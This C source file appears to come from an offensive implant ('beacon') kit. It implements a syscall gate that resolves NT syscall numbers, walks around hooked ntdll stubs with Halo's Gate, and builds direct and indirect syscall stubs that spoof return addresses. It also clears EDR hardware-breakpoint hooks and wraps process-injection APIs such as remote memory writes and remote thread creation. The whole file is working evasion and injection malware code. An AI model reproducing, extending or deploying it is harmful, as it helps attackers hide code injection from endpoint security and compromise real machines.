/* Phase 2 unified execution gate (see docs/EVASION-ROADMAP.md section 13.2).
 *
 * Shape follows the 4.9.1-era seed that 4.12's kit adopted: a resolved SSN
 * table plus per-callsite wrappers that translate Win32 semantics into the
 * NT call, honouring the operator-visible syscall_method setting:
 *   0 = plain API (no gate), 1 = direct stub (mov eax,ssn; syscall),
 *   2 = indirect stub (jmp ntdll syscall;ret gadget, RA-spoofed v2).
 *
 * Indirect stub v2 plants an ntdll `ret` under the syscall gadget, so the
 * stack frame directly beneath the kernel-visible syscall frame is an
 * ntdll address instead of this unbacked stub page (the deeper beacon
 * frame needs synthetic frames - Phase 2 follow-up).
 *
 * DR check: EDR hardware-breakpoint hooks (Cymulate Blindside lineage)
 * live in DR0-3; the gate samples and clears them on resolve and every
 * 128th dispatch. */
#include <Windows.h>
#include <string.h>
#include "syscalls.h"
#include "datastore.h"

typedef LONG NTSTATUS;
#ifndef NTAPI
#define NTAPI WINAPI
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

#if defined(_M_X64)

typedef struct {
	DWORD ssn;
	BYTE * gadget; /* ntdll syscall;ret */
	BYTE * stub;   /* VirtualAlloc'd page; RW except while rewritten */
	BOOL  ready;
	BYTE  arity;   /* NT parameter count: >4 means stack args, where the
	                * v2 push would shift them under the kernel's nose */
} sc_entry;

/* the resolved syscall set (section 13.2): injection / memory / token /
 * wait / file families. Wrappers exist for the hot injection paths; the
 * rest are resolved and queryable so later call sites route without new
 * resolution logic. */
#define SC_LIST(X) \
	X(write,    "NtWriteVirtualMemory", 5) \
	X(read,     "NtReadVirtualMemory", 5) \
	X(dup,      "NtDuplicateObject", 7) \
	X(alloc,    "NtAllocateVirtualMemory", 6) \
	X(protect,  "NtProtectVirtualMemory", 5) \
	X(free,     "NtFreeVirtualMemory", 4) \
	X(mapview,  "NtMapViewOfSection", 10) \
	X(unmap,    "NtUnmapViewOfSection", 2) \
	X(sect,     "NtCreateSection", 7) \
	X(openproc, "NtOpenProcess", 3) \
	X(openthrd, "NtOpenThread", 3) \
	X(qviproc,  "NtQueryInformationProcess", 5) \
	X(qvithrd,  "NtQueryInformationThread", 5) \
	X(qvmem,    "NtQueryVirtualMemory", 6) \
	X(wait1,    "NtWaitForSingleObject", 3) \
	X(waitex,   "NtWaitForSingleObjectEx", 4) \
	X(close,    "NtClose", 1) \
	X(cfile,    "NtCreateFile", 11) \
	X(rfile,    "NtReadFile", 9) \
	X(wfile,    "NtWriteFile", 9) \
	X(apc,      "NtQueueUserApc", 3) \
	X(getctx,   "NtGetContextThread", 2) \
	X(setctx,   "NtSetContextThread", 2) \
	X(resume,   "NtResumeThread", 2) \
	X(thrdex,   "NtCreateThreadEx", 11)

#define SC_DECL(id, name, ar) static sc_entry sc_##id;
SC_LIST(SC_DECL)

static BOOL sc_ready;

static BYTE * find_syscall_insn(BYTE * p, int maxn) {
	int i;
	for (i = 0; i < maxn - 1; i++) {
		if (p[i] == 0x0F && p[i + 1] == 0x05)
			return p + i;
	}
	return NULL;
}

static BOOL parse_nt_stub(BYTE * fn, sc_entry * out) {
	int i;
	if (fn == NULL || out == NULL)
		return FALSE;
	memset(out, 0, sizeof(*out));
	/* hooked? try Halo's Gate: walk neighboring 32-byte slots */
	if (fn[0] == 0xE9 || fn[0] == 0xFF) {
		int delta;
		for (delta = 1; delta < 16; delta++) {
			BYTE * up = fn + delta * 32;
			BYTE * down = fn - delta * 32;
			if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
				out->ssn = *(DWORD *)(up + 4) - (DWORD)delta;
				out->gadget = find_syscall_insn(up, 24);
				return out->gadget != NULL;
			}
			if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
				out->ssn = *(DWORD *)(down + 4) + (DWORD)delta;
				out->gadget = find_syscall_insn(down, 24);
				return out->gadget != NULL;
			}
		}
		return FALSE;
	}
	for (i = 0; i < 24; i++) {
		if (fn[i] == 0xB8) {
			out->ssn = *(DWORD *)(fn + i + 1);
			out->gadget = find_syscall_insn(fn, 32);
			return out->gadget != NULL;
		}
	}
	(void)i;
	return FALSE;
}

static void build_direct_stub(BYTE * dst, DWORD ssn) {
	/* mov r10, rcx; mov eax, SSN; syscall; ret */
	dst[0] = 0x4C; dst[1] = 0x8B; dst[2] = 0xD1;
	dst[3] = 0xB8;
	memcpy(dst + 4, &ssn, 4);
	dst[8] = 0x0F; dst[9] = 0x05;
	dst[10] = 0xC3;
}

/* ---- DR sampling / clearing (hardware-breakpoint hook defense) ---- */

static void gate_dr_check(void) {
	CONTEXT * ctx;
	BYTE buf[sizeof(CONTEXT) + 16];

	memset(buf, 0, sizeof(buf));
	ctx = (CONTEXT *)(((DWORD_PTR)buf + 15) & ~(DWORD_PTR)15);
	ctx->ContextFlags = 0x00100010; /* CONTEXT_DEBUG_REGISTERS */
	if (!GetThreadContext(GetCurrentThread(), ctx))
		return;
	if (ctx->Dr0 == 0 && ctx->Dr1 == 0 && ctx->Dr2 == 0 && ctx->Dr3 == 0 &&
	    (ctx->Dr7 & 0xFF) == 0)
		return;
	/* an EDR (or a debugger) parked a hardware breakpoint in this thread:
	 * clear it. Legit software never has user DR hooks here. */
	ctx->Dr0 = 0;
	ctx->Dr1 = 0;
	ctx->Dr2 = 0;
	ctx->Dr3 = 0;
	ctx->Dr6 = 0;
	ctx->Dr7 = 0;
	SetThreadContext(GetCurrentThread(), ctx);
}

static DWORD gate_dispatch_count;

static void * make_exec(sc_entry * e, int indirect) {
	DWORD old = 0;
	BYTE built[48]; /* v2 indirect stub is 33 bytes - keep headroom so the
	                 * gadget qword never writes past the buffer (the first
	                 * cut overflowed built[32] by one byte and fail-fasted
	                 * the /GS cookie on CI) */
	BYTE * p;
	SIZE_T stub_size = 64;

	if (!e->ready)
		return NULL;

	/* The stub used to live in static .data flipped to RWX for the process
	 * lifetime. VirtualProtect is page-granular, so making the .data page
	 * non-writable would break neighbouring statics - instead give each
	 * stub its own page, build it locally, and only ever expose RW->RX
	 * (never RWX). */
	if (e->stub == NULL) {
		e->stub = (BYTE *)VirtualAlloc(NULL, stub_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (e->stub == NULL)
			return NULL;
	}

	if ((++gate_dispatch_count & 127) == 0)
		gate_dr_check();

	p = e->stub;

	memset(built, 0, sizeof(built));
	if (indirect && e->gadget && e->arity > 4) {
		/* stack-argument syscalls: the v2 push would shift [rsp+8..]
		 * under the kernel's nose - fall back to the v1 plain indirect
		 * jump (hides everything except the immediate stub frame).
		 * Full RA spoof for these needs synthetic frames (13.2). */
		built[0] = 0x4C; built[1] = 0x8B; built[2] = 0xD1;
		built[3] = 0xB8;
		memcpy(built + 4, &e->ssn, 4);
		built[8] = 0xFF; built[9] = 0x25; /* jmp qword ptr [rip+0] */
		memcpy(built + 14, &e->gadget, 8);
	}
	else if (indirect && e->gadget) {
		/* v2 RA spoof:
		 *   mov r10, rcx; mov eax, SSN
		 *   mov rax, gadget+2 ; push rax     <- bare `ret` inside ntdll
		 *   jmp [rip+0] -> gadget (syscall; ret)
		 * syscall returns -> gadget ret pops the pushed ntdll ret ->
		 * that ret pops the caller's real return address. The frame under
		 * the kernel-visible syscall is ntdll, not this unbacked page. */
		built[0] = 0x4C; built[1] = 0x8B; built[2] = 0xD1;
		built[3] = 0xB8;
		memcpy(built + 4, &e->ssn, 4);
		built[8] = 0x48; built[9] = 0xB8; /* mov rax, imm64 */
		{
			unsigned long long r = (unsigned long long)(e->gadget + 2);
			memcpy(built + 10, &r, 8);
		}
		built[18] = 0x50; /* push rax */
		built[19] = 0xFF; built[20] = 0x25; /* jmp qword ptr [rip+0] */
		memcpy(built + 25, &e->gadget, 8); /* bytes 25..32: 33-byte stub */
	}
	else {
		build_direct_stub(built, e->ssn);
	}

	if (!VirtualProtect(p, stub_size, PAGE_READWRITE, &old))
		return NULL;
	memcpy(p, built, stub_size);
	if (!VirtualProtect(p, stub_size, PAGE_EXECUTE_READ, &old))
		return NULL;
	FlushInstructionCache(GetCurrentProcess(), p, stub_size);
	return p;
}

void syscalls_resolve(void) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	if (ntdll == NULL)
		return;
#define SC_PARSE(id, name) do { \
		BYTE * fn = (BYTE *)GetProcAddress(ntdll, name); \
		sc_##id.ready = (fn != NULL) && parse_nt_stub(fn, &sc_##id); \
	} while (0);
	SC_LIST(SC_PARSE)
	sc_ready = sc_write.ready; /* legacy readiness = the write entry */
	gate_dr_check();
}

int syscalls_ssn_ntwrite(void) {
	return (sc_ready && sc_write.ready) ? (int)sc_write.ssn : 0;
}

int syscalls_gate_ready_count(void) {
	int n = 0;
#define SC_COUNT(id, name, ar) n += sc_##id.ready ? 1 : 0;
	SC_LIST(SC_COUNT)
	return n;
}

/* ---- typed dispatchers (arity kept exact per NT signature) ---- */

typedef NTSTATUS(NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fn_NtFreeVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI *fn_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, void *, HANDLE, void *, void *, ULONG, SIZE_T, SIZE_T, SIZE_T, void *);

static int sc_method(void) {
	return syscall_method_get();
}

static NTSTATUS sc_call_write(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T w) {
	int m = sc_method();
	fn_NtWriteVirtualMemory fn;
	if (m == 0 || !sc_write.ready)
		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
	fn = (fn_NtWriteVirtualMemory)make_exec(&sc_write, m == 2);
	if (fn == NULL)
		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
	return fn(p, a, b, n, w);
}

static NTSTATUS sc_call_read(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T r) {
	int m = sc_method();
	fn_NtReadVirtualMemory fn;
	if (m == 0 || !sc_read.ready)
		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
	fn = (fn_NtReadVirtualMemory)make_exec(&sc_read, m == 2);
	if (fn == NULL)
		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
	return fn(p, a, b, n, r);
}

static NTSTATUS sc_call_dup(HANDLE sp, HANDLE sh, HANDLE tp, PHANDLE th, ACCESS_MASK acc, ULONG attr, ULONG opt) {
	int m = sc_method();
	fn_NtDuplicateObject fn;
	if (m == 0 || !sc_dup.ready)
		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
	fn = (fn_NtDuplicateObject)make_exec(&sc_dup, m == 2);
	if (fn == NULL)
		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
	return fn(sp, sh, tp, th, acc, attr, opt);
}

static NTSTATUS sc_call_alloc(HANDLE p, PVOID * base, ULONG_PTR zero, PSIZE_T size, ULONG type, ULONG prot) {
	int m = sc_method();
	fn_NtAllocateVirtualMemory fn;
	if (m == 0 || !sc_alloc.ready)
		return ((fn_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))(p, base, zero, size, type, prot);
	fn = (fn_NtAllocateVirtualMemory)make_exec(&sc_alloc, m == 2);
	if (fn == NULL)
		return ((fn_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))(p, base, zero, size, type, prot);
	return fn(p, base, zero, size, type, prot);
}

static NTSTATUS sc_call_protect(HANDLE p, PVOID * base, PSIZE_T size, ULONG prot, PULONG oldp) {
	int m = sc_method();
	fn_NtProtectVirtualMemory fn;
	if (m == 0 || !sc_protect.ready)
		return ((fn_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))(p, base, size, prot, oldp);
	fn = (fn_NtProtectVirtualMemory)make_exec(&sc_protect, m == 2);
	if (fn == NULL)
		return ((fn_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))(p, base, size, prot, oldp);
	return fn(p, base, size, prot, oldp);
}

static NTSTATUS sc_call_free(HANDLE p, PVOID * base, PSIZE_T size, ULONG type) {
	int m = sc_method();
	fn_NtFreeVirtualMemory fn;
	if (m == 0 || !sc_free.ready)
		return ((fn_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory"))(p, base, size, type);
	fn = (fn_NtFreeVirtualMemory)make_exec(&sc_free, m == 2);
	if (fn == NULL)
		return ((fn_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory"))(p, base, size, type);
	return fn(p, base, size, type);
}

static NTSTATUS sc_call_threadex(PHANDLE out, ACCESS_MASK acc, void * oa, HANDLE proc, void * start, void * arg,
                                 ULONG flags, SIZE_T zero, SIZE_T stack, SIZE_T maxstack, void * attrs) {
	int m = sc_method();
	fn_NtCreateThreadEx fn;
	if (m == 0 || !sc_thrdex.ready)
		return ((fn_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
	fn = (fn_NtCreateThreadEx)make_exec(&sc_thrdex, m == 2);
	if (fn == NULL)
		return ((fn_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
	return fn(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
}
#else
void syscalls_resolve(void) {}
int syscalls_ssn_ntwrite(void) { return 0; }
int syscalls_gate_ready_count(void) { return 0; }
#endif

/* ===================== Win32-shaped gate wrappers ===================== */

BOOL beacon_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) {
#if defined(_M_X64)
	NTSTATUS st;
	SIZE_T wrote = 0;
	if (syscall_method_get() == 0)
		return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	st = sc_call_write(hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, &wrote);
	if (lpNumberOfBytesWritten)
		*lpNumberOfBytesWritten = wrote;
	return NT_SUCCESS(st);
#else
	return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
#endif
}

BOOL beacon_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead) {
#if defined(_M_X64)
	NTSTATUS st;
	SIZE_T got = 0;
	if (syscall_method_get() == 0)
		return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
	st = sc_call_read(hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, &got);
	if (lpNumberOfBytesRead)
		*lpNumberOfBytesRead = got;
	return NT_SUCCESS(st);
#else
	return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
#endif
}

BOOL beacon_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
#if defined(_M_X64)
	NTSTATUS st;
	ULONG attr;
	if (syscall_method_get() == 0)
		return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
	attr = bInheritHandle ? 0x00000002 : 0; /* OBJ_INHERIT */
	st = sc_call_dup(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, attr, dwOptions);
	return NT_SUCCESS(st);
#else
	return DuplicateHandle(hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions);
#endif
}

LPVOID beacon_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
#if defined(_M_X64)
	NTSTATUS st;
	PVOID base = lpAddress;
	SIZE_T size = dwSize;

	if (syscall_method_get() == 0)
		return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
	st = sc_call_alloc(hProcess, &base, 0, &size, flAllocationType, flProtect);
	return NT_SUCCESS(st) ? base : NULL;
#else
	return VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
#endif
}

BOOL beacon_VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
#if defined(_M_X64)
	NTSTATUS st;
	PVOID base = lpAddress;
	SIZE_T size = dwSize;
	ULONG oldp = 0;

	if (syscall_method_get() == 0)
		return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
	st = sc_call_protect(hProcess, &base, &size, flNewProtect, &oldp);
	if (lpflOldProtect)
		*lpflOldProtect = oldp;
	return NT_SUCCESS(st);
#else
	return VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect);
#endif
}

BOOL beacon_VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType) {
#if defined(_M_X64)
	NTSTATUS st;
	PVOID base = lpAddress;
	SIZE_T size = dwSize;

	if (syscall_method_get() == 0)
		return VirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
	st = sc_call_free(hProcess, &base, &size, dwFreeType);
	return NT_SUCCESS(st);
#else
	return VirtualFreeEx(hProcess, lpAddress, dwSize, dwFreeType);
#endif
}

HANDLE beacon_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES sa, SIZE_T stack, LPTHREAD_START_ROUTINE start, LPVOID param, DWORD flags, LPDWORD outId) {
#if defined(_M_X64)
	NTSTATUS st;
	HANDLE th = NULL;

	if (syscall_method_get() == 0)
		return CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
	st = sc_call_threadex(&th, 0x1FFFFF /* THREAD_ALL_ACCESS */, NULL, hProcess,
	                      (void *)start, param,
	                      flags & CREATE_SUSPENDED ? 1 : 0, /* CreateFlags: CREATE_SUSPENDED */
	                      0, stack ? stack : 0, 0, NULL);
	if (!NT_SUCCESS(st))
		return NULL;
	if (outId) {
		/* thread id via the handle: only queried lazily by callers that
		 * need it; none of our inject paths read outId */
		*outId = 0;
	}
	return th;
#else
	return CreateRemoteThread(hProcess, sa, stack, start, param, flags, outId);
#endif
}
